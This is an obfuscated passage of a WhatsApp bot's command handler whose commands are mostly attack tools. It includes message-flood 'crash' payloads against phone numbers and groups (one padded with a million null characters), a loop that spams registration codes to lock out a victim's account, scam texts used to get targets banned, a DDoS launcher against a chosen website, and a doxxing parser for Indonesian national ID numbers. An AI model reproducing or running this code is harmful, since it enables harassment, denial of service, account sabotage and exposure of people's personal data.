                  _0x1feb98 = '' + _0x404f64 + _0x5676bc + _0x226300;
                } else {
                  if (_0x2e6f94 == 4) {
                    _0x1feb98 = '' + _0x404f64 + _0x5676bc + _0x226300 + _0x34086d;
                  }
                }
              }
            }
            var _0x25d901 = await _0x2f9d2e.onWhatsApp('' + _0x2be94a + _0x5a37fd + _0x596737 + "@s.whatsapp.net");
            var _0x1c7303 = _0x25d901.length !== 0 ? _0x25d901 : false;
            try {
              try {
                var _0x2ea2e5 = await _0x2f9d2e.fetchStatus(_0x25d901[0].jid);
              } catch {
                var _0x2ea2e5 = "401";
              }
              if (_0x2ea2e5 == "401" || _0x2ea2e5.status.length == 0) {
                _0x1fbf17 += "wa.me/" + _0x25d901[0].jid.split('@')[0] + "\n";
              } else {
                const _0x241a2b = moment(_0x2ea2e5.setAt).tz("Asia/Jakarta").format("YYYY");
                if (!(_0x241a2b in _0x112f2b)) {
                  _0x112f2b[_0x241a2b] = [];
                }
                _0x112f2b[_0x241a2b].push("wa.me/" + _0x25d901[0].jid.split('@')[0] + "\nBio : " + _0x2ea2e5.status + "\nDate : " + moment(_0x2ea2e5.setAt).tz("Asia/Jakarta").format("HH:mm:ss DD/MM/YYYY") + "\n\n");
              }
            } catch {
              _0x5ed7bb += '' + _0x2be94a + _0x5a37fd + _0x596737 + "\n";
            }
          }
          const _0x37290d = Object.keys(_0x112f2b).map(_0x1a91a8 => {
            return "*[ " + _0x1a91a8 + " ]*\n" + _0x112f2b[_0x1a91a8].join('');
          }).join("\n");
          const _0x30e406 = "Results of\n" + _0x57813a + ":\n\n" + "Have a bio\n" + _0x37290d + _0x1fbf17 + _0x5ed7bb + "\n\n.";
          _0x41d276(_0x30e406);
        }
        break;
      case "ytmp3":
      case "youtubemp3":
        {
          if (!_0x4cefc4) {
            return _0x41d276("*.*");
          }
          if (!q) {
            return _0x41d276("Example : " + (_0x11f9b4 + _0x63bd7f) + " https://youtube.com/watch?v=PtFMh6Tccag%2");
          }
          await _0x333a9e();
          _0x5df05d(q);
        }
        break;
      case "cek?":
        {
          let _0x290327 = runtime(process.uptime());
          _0x41d276("Bot siap digunakan 🤗.\nBot telah aktif selama " + _0x290327);
        }
        break;
      case "bugvid1":
        if (!_0x4cefc4) {
          return _0x41d276("*.*");
        }
        bugvid1 = fs.readFileSync("./lib/video/bug1.mp4");
        const _0x504c3f = {
          video: bugvid1
        };
        const _0x46bf86 = {
          quoted: _0x3d3d7e
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x504c3f, _0x46bf86);
        break;
      case "bugvid2":
        if (!_0x4cefc4) {
          return _0x41d276("*.*");
        }
        bugvid1 = fs.readFileSync("./lib/video/bug2.mp4");
        const _0x42ae9a = {
          video: bugvid1
        };
        const _0x574b6a = {
          quoted: _0x3d3d7e
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x42ae9a, _0x574b6a);
        break;
      case "paptt":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example " + (_0x11f9b4 + _0x63bd7f) + " foto/video");
        }
        papttfoto = JSON.parse(fs.readFileSync("./lib/paptt-foto.json"));
        papttvideo = JSON.parse(fs.readFileSync("./lib/paptt-video.json"));
        titid1 = papttfoto[Math.floor(Math.random() * papttfoto.length)];
        titid2 = papttvideo[Math.floor(Math.random() * papttvideo.length)];
        if (q == "foto") {
          _0x41d276("Photos will be sent via private chat ( *PC* )");
          const _0x1d3468 = {
            url: titid1
          };
          const _0x98554 = {
            image: _0x1d3468,
            caption: "Mana Tahan🥵"
          };
          _0x2f9d2e.sendMessage(_0x18a4d7.sender, _0x98554, {
            'quoted': _0x18a4d7
          });
        } else {
          if (q == "video") {
            _0x41d276("Video will be sent via private chat ( *PC* )");
            const _0x1c6b90 = {
              url: titid2
            };
            const _0x2484df = {
              video: _0x1c6b90,
              caption: "Mana Tahan🥵"
            };
            _0x2f9d2e.sendMessage(_0x18a4d7.sender, _0x2484df, {
              'quoted': _0x18a4d7
            });
          }
        }
        break;
      case "tourl":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x38c03a) {
            return _0x41d276("Reply Media");
          }
          _0x41d276("*please wait a moment*");
          let _0x1bf73c = await _0x2f9d2e.downloadAndSaveMediaMessage(_0x38c03a);
          if (/image/.test(_0x5d666c)) {
            anuh = await _0x1268c9(_0x1bf73c);
            _0x41d276(util.format(anuh));
          } else {
            if (/video/.test(_0x5d666c)) {
              anuh = await _0x1268c9(_0x1bf73c);
              _0x41d276(util.format(anuh));
            } else if (!/image/.test(_0x5d666c)) {
              anuh = await _0x3049a7(_0x1bf73c);
              _0x41d276(util.format(anuh));
            }
          }
          await fs.unlinkSync(_0x1bf73c);
        }
        break;
      case "txtban1":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        _0x41d276("Hola😁, ¿necesitas dinero? Ofrezco un sitio de apuestas en línea con premios en metálico de $700 y condiciones simples. Puedes hacer un depósito mínimo de $70 y puedes duplicar tu dinero.\n💰 Realice un depósito inmediatamente en mi sitio de apuestas en línea y obtenga la mayor cantidad de dinero posible. registrarse en mi sitio de apuestas en línea a través de\nEnlace : https://registrarse.en.el.sitio.de.apuestas/\nCorreo electrónico : support@support.whatsapp.com\nWhatsapp : https://api.whatsapp.com/send?phone=");
        break;
      case "txtban2":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        _0x41d276("Hola, ¿Necesitas un trabajo para ganar dinero? Quiero ofrecerte un trabajo muy fácil y podrás duplicar todo tu dinero. Te ofrezco un trabajo, concretamente ser administrador de un sitio de juegos de azar online con un premio de 900$ y un depósito mínimo de 70$. Si estás interesado en aceptar una oferta de trabajo mía, puedes comunicarte al número de soporte 👇\nhttps://api.whatsapp.com/send?phone=\n💰 También puedes participar en este juego de apuestas en línea registrándote en nuestro sitio y realizando un depósito mínimo de 70$. Vamos, deposita inmediatamente para duplicar tu dinero 💸. Regístrese en nuestro sitio de apuestas en línea y el enlace de registro está disponible a continuación 👇\nhttps://registrarse.en.el.sitio.de.apuestas/\n*support@support.whatsapp.com*");
        break;
      case "txtban3":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        _0x41d276("🎲 ONLINE-WETSEITE 🎲\nHallo, ich komme von einem Online-Glücksspielseitenunternehmen namens rxhl888. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite rxhl888 einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite rxhl888\n🎮 Wettseiten: https://register.rxhl888.bet/\nAlternative zur Registrierung 👇\n🎮 Facebook : Rxhl888\n🎮 Whatsapp : https://api.whatsapp.com/send?phone=+6289630514341\nBitte registrieren Sie sich, um Ihr Geld zu verdoppeln 🤤");
        break;
      case "crash1jam":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Insert Target number");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : _0x2a2cee.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        jumlah = 900;
        _0x10ce4c(Pe, jumlah);
        await sleep(2000);
        _0x41d276("*</> Successfully sent bug to number " + Pe + ". Please pause commenting for 3 minutes 🤗");
        break;
      case "crash1hari":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Insert Target number");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : _0x2a2cee.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        jumlah = 21600;
        _0x10ce4c(Pe, jumlah);
        await sleep(2000);
        _0x41d276("*</> Successfully sent bug to number " + Pe + ". Please pause commenting for 3 minutes 🤗");
        break;
      case "bannedno":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276(" Enter the Target number Prefix \"+\" and Country Code");
        }
        const _0x223151 = {
          text: "اربح المال بسهولة عبر الإنترنت لمدة ساعة واحدة بسعر 10 آلاف💰.\nفقط في هذا الاستبيان، قم بتسجيل حسابك على الفور، ما عليك سوى رقم واتساب جاهز للاتصال بالإنترنت 🤑.\nلا تفوت هذه الفرصة، سجل الآن باستخدام رمز QR 📄\n\nقم بالرد بـ \"1\" وانقر على الرابط أدناه 👇\nhttps://server.go-share.top/\n\nوتواصل مع WhatsApp الخاص بي إذا كنت ترغب في الحصول على مكافأة!!🎁\nhttps://api.whatsapp.com/send?phone=" + q
        };
        const _0x297223 = {
          quoted: _0x18a4d7
        };
        await _0x2f9d2e.sendMessage(_0x537416, _0x223151, _0x297223);
        sleep(2000);
        _0x41d276("👆  text above then check Target number 👆\n\n\n ⚠️ Warning: not all numbers can be banned");
        break;
      case "tempban":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x2a2cee) {
            return _0x41d276("Example: " + (_0x11f9b4 + _0x63bd7f) + " 91|918xxxx");
          }
          if (!/|/.test(_0x2a2cee)) {
            return _0x41d276("The data you provided is invalid!, Example: \n " + (_0x11f9b4 + _0x63bd7f) + " 91|6909137211");
          }
          let _0x3065ad = JSON.parse(fs.readFileSync("./lib/tempban/ban.json"));
          let _0x56c113 = _0x2a2cee.split('|')[0];
          let _0x104689 = _0x2a2cee.split('|')[1];
          let _0x448ec6 = _0x56c113 + _0x104689;
          await _0x41d276("Success! Registration Interruption has been successfully activated to the target : " + _0x448ec6 + " for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.");
          let {
            state: _0x46320b
          } = await useMultiFileAuthState("tempban");
          let _0x3d66c5 = makeWASocket({
            'auth': _0x46320b,
            'mobile': true,
            'logger': _0x14ed4e({
              'level': "silent"
            })
          });
          let _0x2966e2 = async () => {
            try {
              let _0x8ad393 = await _0x3d66c5.requestRegistrationCode({
                'phoneNumber': '+' + _0x448ec6,
                'phoneNumberCountryCode': _0x56c113,
                'phoneNumberNationalNumber': _0x104689,
                'phoneNumberMobileCountryCode': 0x2d4
              });
              if (_0x8ad393.reason === "temporarily_unavailable") {
                console.log("Invalid Number (Possibility of Interrupted Registration): +" + _0x8ad393.login);
                await sleep(100);
                await _0x2966e2();
              }
            } catch (_0x3c80dc) {}
          };
          const _0x5ee6d7 = {
            cCode: _0x56c113,
            number: _0x104689
          };
          _0x3065ad[_0x448ec6] = _0x5ee6d7;
          fs.writeFileSync("./lib/tempban/ban.json", JSON.stringify(_0x3065ad, null, "\t"));
          setInterval(() => {
            _0x2966e2();
          }, 400);
        }
        break;
      case "bughomegc":
      case "crashgc-v1":
      case "crashgc-v2":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 120xxxx|5");
        }
        victim = _0x2a2cee.split('|')[0];
        amount = _0x2a2cee.split('|')[1];
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : victim.replace(/[^0-9]/g, '') + "@g.us";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x9e8f18 = 0; _0x9e8f18 < amount; _0x9e8f18++) {
          const _0x4f47cb = {
            title: '',
            subtitle: " "
          };
          var _0x56a93d = generateWAMessageFromContent(_0x537416, proto.Message.fromObject({
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': _0x4f47cb,
                  'body': {
                    'text': "IYA IN"
                  },
                  'footer': {
                    'text': "›RxhlOfficial"
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{ display_text : 'RxhlBugWhatsApp', url : , merchant_url :  }"
                    }],
                    'messageParamsJson': "\0".repeat(1000000)
                  }
                }
              }
            }
          }), {
            'userJid': _0x537416,
            'quoted': _0x18a4d7
          });
          await _0x2f9d2e.relayMessage(Pe, _0x56a93d.message, {
            'messageId': _0x56a93d.key.id
          });
        }
        _0x41d276("</> Succes");
        break;
      case "ddosv1":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q.includes(" ")) {
          return _0x41d276("Use Methode: ." + _0x63bd7f + " <target> <time>\nExaple: ." + _0x63bd7f + " example.my.id 60");
        }
        const _0x37072d = q.substring(0, q.indexOf(" ") - 0);
        const _0x331482 = q.substring(q.lastIndexOf(" ") + 1);
        let _0x2ec317 = "*Bot is Attacking Wait for Results* 😤\n• _Target_ ->  " + _0x37072d + " \n• _Time Attack_ -> " + _0x331482 + " ";
        const _0x275fbe = {
          body: _0x2ec317,
          footer: ''
        };
        _0x2f9d2e.sendButton(_0x537416, [{
          'name': "cta_url",
          'buttonParamsJson': JSON.stringify({
            'display_text': "Cek Websait",
            'url': '' + _0x37072d,
            'merchant_url': '' + _0x37072d
          })
        }], _0x18a4d7, _0x275fbe);
        _0x5a36ba("node ./lib/ddos/ddos.js " + _0x37072d + " " + _0x331482, {
          'maxBuffer': 1048576
        }, (_0x1782e5, _0x47d024, _0x4daa82) => {
          if (_0x1782e5) {
            _0x41d276("Error: " + _0x1782e5.message);
            return;
          }
          if (_0x4daa82) {
            _0x41d276("Error: " + _0x4daa82);
            return;
          }
          _0x41d276("Success\n\n• Target: " + _0x37072d + ",\n• Time: " + _0x331482);
        });
        break;
      case "iosfull":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x31e1b3 = 0; _0x31e1b3 < 6; _0x31e1b3++) {
          _0x50af8b(Pe);
          await sleep(500);
          _0x50af8b(Pe);
          await sleep(500);
          _0x50af8b(Pe);
          await sleep(500);
          _0x50af8b(Pe);
          await sleep(500);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "iosfullv2":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0xd1b063 = 0; _0xd1b063 < 6; _0xd1b063++) {
          _0x5bbaac(Pe);
          await sleep(500);
          _0x5bbaac(Pe);
          await sleep(500);
          _0x5bbaac(Pe);
          await sleep(500);
          _0x5bbaac(Pe);
          await sleep(500);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "samsungcrash":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0xaaebe = 0; _0xaaebe < 6; _0xaaebe++) {
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x40fd73(Pe);
          _0x2a4ade(Pe);
          _0x455c3d(Pe);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x40fd73(Pe);
          _0x2a4ade(Pe);
          _0x455c3d(Pe);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "slayer07":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x5c7431 = 0; _0x5c7431 < 6; _0x5c7431++) {
          _0x40fd73(Pe);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(500);
          _0x2a4ade(Pe);
          await sleep(500);
          _0x455c3d(Pe);
          await sleep(500);
          _0x50af8b(Pe);
          await sleep(500);
          _0x43ea20(Pe, _0x35da8d);
          await sleep(500);
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(500);
          _0x4ae6a7(Pe, _0x2cdb40);
          const _0x3ccfb9 = {
            image: _0x2f1d7d,
            caption: "SLAYER 07"
          };
          const _0x4d77a1 = {
            quoted: _0x18a4d7
          };
          _0x2f9d2e.sendMessage(Pe, _0x3ccfb9, _0x4d77a1);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "darkness":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x37db39 = 0; _0x37db39 < 6; _0x37db39++) {
          _0x40fd73(Pe);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(500);
          _0x2a4ade(Pe);
          await sleep(500);
          _0x455c3d(Pe);
          await sleep(500);
          _0x50af8b(Pe);
          await sleep(500);
          _0x43ea20(Pe, _0x35da8d);
          await sleep(500);
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(500);
          _0x4ae6a7(Pe, _0x2cdb40);
          const _0x39840f = {
            document: _0x2f1d7d,
            caption: "Darkness 㐅"
          };
          const _0x2a52e4 = {
            quoted: _0x18a4d7
          };
          _0x2f9d2e.sendMessage(Pe, _0x39840f, _0x2a52e4);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "virkon":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x47651a = 0; _0x47651a < 6; _0x47651a++) {
          _0x40fd73(Pe);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(500);
          _0x2a4ade(Pe);
          await sleep(500);
          _0x455c3d(Pe);
          await sleep(500);
          _0x50af8b(Pe);
          await sleep(500);
          _0x43ea20(Pe, _0x35da8d);
          await sleep(500);
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(500);
          _0x4ae6a7(Pe, _0x2cdb40);
          const _0x12fac9 = {
            image: _0x2f1d7d,
            caption: "Virkon WhatsApp ✅"
          };
          const _0x280781 = {
            quoted: _0x18a4d7
          };
          _0x2f9d2e.sendMessage(Pe, _0x12fac9, _0x280781);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "dox":
      case "nikparser":
        {
          if (!_0x4d4b5c) {
            return;
          }
          if (!q) {
            return _0x41d276("*Example*: " + (_0x11f9b4 + _0x63bd7f) + " 3216728xxxxxxx");
          }
          nik = q.toString();
          const _0x2071ff = require("./lib/getdata/wilayah.json");
          const _0x2efe13 = new Date().getFullYear().toString().substr(-2);
          const _0x2efae3 = nik.substring(10, 12);
          const _0x38e982 = nik.substring(6, 8);
          if (nik.length == 16) {
            provinceid = nik.substring(0, 2);
            province = _0x2071ff.provinsi[nik.substring(0, 2)];
            kabupatenKotaId = nik.substring(0, 4);
            kabupatenKota = _0x2071ff.kabkot[nik.substring(0, 4)];
            kecamatanId = nik.substring(0, 6);
            kecamatan = _0x2071ff.kecamatan[nik.substring(0, 6)].split(" -- ")[0];
            kodepos = _0x2071ff.kecamatan[nik.substring(0, 6)].slice(-5);
            kelamin = _0x38e982 > 40 ? "Perempuan" : "Laki-laki";
            lahir = _0x38e982 > 40 ? (_0x38e982 - 40).toString().length > 1 ? (_0x38e982 - 40).toString() : '0' + (_0x38e982 - 40).toString() : _0x38e982;
            X = nik.substring(8, 10);
            V = _0x2efae3 < _0x2efe13 ? '20' + _0x2efae3 : '19' + _0x2efae3;
            Z = nik.substring(12, 16);
          } else {
            return _0x41d276("Nomor NIK harus 16 digit");
          }
          await sleep(3000);
          _0x41d276("[ RXHL OFC ]\n\nNik: " + q + "\nProvice ID: " + provinceid + "\nProvince: " + province + "\nKabupaten ID: " + kabupatenKotaId + "\nNama Kabupaten: " + kabupatenKota + "\nKecamatan ID: " + kecamatanId + "\nNama Kecamatan: " + kecamatan + "\nKode Pos: " + kodepos + "\nKelamin: " + kelamin + "\nLahir: " + lahir + '/' + X + '/' + V + "\nUniqcode: " + Z);
        }
        break;
      case "getnik":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        tutor = fs.readFileSync("./lib/video/tutor.mp4");
        const _0x1b34fc = {
          video: tutor,
          caption: "Bot Telegram untuk mendapatkan nik target: @IDOOSINTBOT / https://t.me/IDOOSINTBOT"
        };
        const _0x3aee68 = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x1b34fc, _0x3aee68);
        break;
      case "samsungfull":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x55a7c5 = 0; _0x55a7c5 < 6; _0x55a7c5++) {
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          _0x455c3d(Pe);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          _0x455c3d(Pe);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "samsung-brutal":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x502c67 = 0; _0x502c67 < 6; _0x502c67++) {
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          _0x455c3d(Pe);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          _0x455c3d(Pe);
          await sleep(200);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "fatal-notif":
      case "fatal-ui":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x411c9f = 0; _0x411c9f < 6; _0x411c9f++) {
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(200);
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(200);
          _0x1e091c(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
          _0x32754e(Pe, _0x2cdb40);
          await sleep(200);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "bug-brutal":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x2ce416 = 0; _0x2ce416 < 6; _0x2ce416++) {
          _0x455c3d(Pe);
          _0x1e091c(Pe, _0x2cdb40);
          _0x32754e(Pe, _0x2cdb40);
          _0x50af8b(Pe);
          await sleep(200);
          _0x455c3d(Pe);
          _0x43ea20(Pe, _0x35da8d);
          _0x2a4ade(Pe);
          await sleep(2000);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "crash-all-dvc":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x3235be = 0; _0x3235be < 6; _0x3235be++) {
          _0x455c3d(Pe);
          _0x50af8b(Pe);
          await sleep(100);
          _0x32754e(Pe, _0x2cdb40);
          _0x43ea20(Pe, _0x35da8d);
          await sleep(100);
          _0x2a4ade(Pe);
          _0x1e091c(Pe, _0x2cdb40);
          _0x455c3d(Pe);
          _0x50af8b(Pe);
          await sleep(100);
          _0x32754e(Pe, _0x2cdb40);
          _0x43ea20(Pe, _0x35da8d);
          await sleep(100);
          _0x2a4ade(Pe);
          _0x1e091c(Pe, _0x2cdb40);
        }
        _0x41d276("</> Successfully submitted the bug *" + _0x63bd7f + '*');
        break;
      case "all-dvc2":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x3153ce = 0; _0x3153ce < 5; _0x3153ce++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x1e091c(Pe, _0x2cdb40);
          await _0x4ae6a7(Pe, _0x2cdb40);
          await _0x455c3d(Pe);
          await _0x5bbaac(Pe);
          await _0x120063(Pe);
          const _0x16aac3 = {
            text: "Saluran WhatsApp\n https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H"
          };
          const _0x2e1367 = {
            quoted: _0x2cdb40
          };
          _0x2f9d2e.sendMessage(Pe, _0x16aac3, _0x2e1367);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x43ea20(Pe, _0x35da8d);
          await _0x1e091c(Pe, _0x2cdb40);
